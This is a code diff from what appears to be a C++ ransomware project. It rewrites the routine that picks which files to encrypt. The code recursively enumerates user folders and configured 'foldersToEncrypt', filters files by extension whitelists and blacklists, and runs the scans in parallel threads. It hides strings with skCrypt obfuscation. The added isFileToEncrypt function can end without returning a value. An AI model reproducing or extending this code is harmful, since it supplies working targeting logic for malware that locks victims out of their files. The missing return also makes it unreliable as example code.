@@ -6,83 +6,74 @@ namespace fs = std::experimental::filesystem;
 vector<string> globalAllFiles;
 mutex allFilesMutex;
 
-void GetAllFiles(const string& username) {
+bool isFileToEncrypt(const string& file) {
+    for (string safeFile : safeFiles)
+        if (safeFile == file)
+            return false;
+
+    vector<string> fileSplitted = Split(file, '.');
+
+    if (ENABLE_WHITELIST)
+        for (string extensionW : whitelist)
+            if (fileSplitted.back() == extensionW)
+                return true;
+
+    if (ENABLE_BLACKLIST)
+        for (string extensionB : blacklist)
+            if (fileSplitted.back() == extensionB)
+                return false;
+}
+
+void GetAllFiles(const string& folderPath) {
     vector<string> tmpFiles;
 
-    for (string file : Split(Exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
-        tmpFiles.push_back(file);
-
-    for (size_t i = 0; i < tmpFiles.size(); i++) {
-        vector<string> fileSplitted = Split(tmpFiles[i], '.');
-
-        for (string safeFile : safeFiles)
-            if (safeFile == tmpFiles[i])
-                goto erase;
-
-        if (ENABLE_WHITELIST)
-            for (string extensionW : whitelist)
-                if (fileSplitted.back() == extensionW)
-                    goto continue_;
-        if (ENABLE_BLACKLIST)
-            for (string extensionB : blacklist)
-                if (fileSplitted.back() == extensionB)
-                    goto erase;
-
-    continue_:
-        continue;
-    erase:
-        tmpFiles.erase(tmpFiles.begin() + i);
-    }
+    for (const auto& entry : fs::recursive_directory_iterator(folderPath))
+        if (fs::is_regular_file(entry))
+            if (isFileToEncrypt(entry.path().string()))
+                tmpFiles.push_back(entry.path().string());
 
     allFilesMutex.lock();
     globalAllFiles.insert(globalAllFiles.end(), tmpFiles.begin(), tmpFiles.end());
     allFilesMutex.unlock();
 }
 
-vector<string> GetFiles(const string& mainDir) {
+vector<string> RetrieveFolders(int argc, char* argv[]) {
+    vector<string> folders;
+
+#if DEBUG
+    if (argc > 1)
+        folders.push_back(argv[1]);
+    else if (FileExists(DEBUG_FOLDER))
+        folders.push_back(DEBUG_FOLDER);
+    else
+        folders.push_back((string)skCrypt(".\\"));
+#else
+    for (string folder : foldersToEncrypt)
+        if (FileExists(folder))
+            folders.push_back(folder);
+#endif
+
+    return folders;
+}
+
+vector<string> GetFiles(const vector<string>& mainDirs) {
     vector<string> result;
+    vector<thread> threads;
 
-    if (DEBUG && !PathIsDirectoryEmptyA((LPCSTR)mainDir.c_str())) {
-        vector<string> files = Split(Exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
-        for (string file : files) {
-            vector<string> fileSplitted = Split(file, '.');
+    for (string dir : mainDirs) {
+        for (const auto& entry : fs::directory_iterator(dir)) {
+            if (fs::is_regular_file(entry))
+                result.push_back(entry.path().string());
 
-            for (string safeFile : safeFiles)
-                if (safeFile == file)
-                    goto continue_;
-
-            if (ENABLE_WHITELIST)
-                for (string extensionW : whitelist)
-                    if (fileSplitted.back() == extensionW)
-                        goto push;
-            if (ENABLE_BLACKLIST)
-                for (string extensionB : blacklist)
-                    if (fileSplitted.back() == extensionB)
-                        goto continue_;
-
-        push:
-            result.push_back(file);
-        continue_:
-            continue;
+            else if (fs::is_directory(entry))
+                threads.push_back(thread(GetAllFiles, entry.path().string()));
         }
     }
 
-    else {
-        vector<thread> threads;
-        for (string user : Split(Exec(skCrypt("dir /b /ad C:\\Users")), '\n')) {
-            if (!FileExists((string)skCrypt("C:\\Users") + user))   /*directory does not exists (idk why)*/
-                continue;
-            if (PathIsDirectoryEmptyA((LPCSTR)((string)skCrypt("C:\\Users\\") + user).c_str()))   /*directory is empty*/
-                continue;
+    for (int i = 0; i < threads.size(); i++)
+        threads[i].join();
 
-            threads.push_back(thread(GetAllFiles, user));
-        }
-        for (int i = 0; i < threads.size(); i++)
-            threads[i].join();
-
-        result.insert(result.end(), globalAllFiles.begin(), globalAllFiles.end());
-    }
-    result.pop_back();
+    result.insert(result.end(), globalAllFiles.begin(), globalAllFiles.end());
     return result;
 }
 
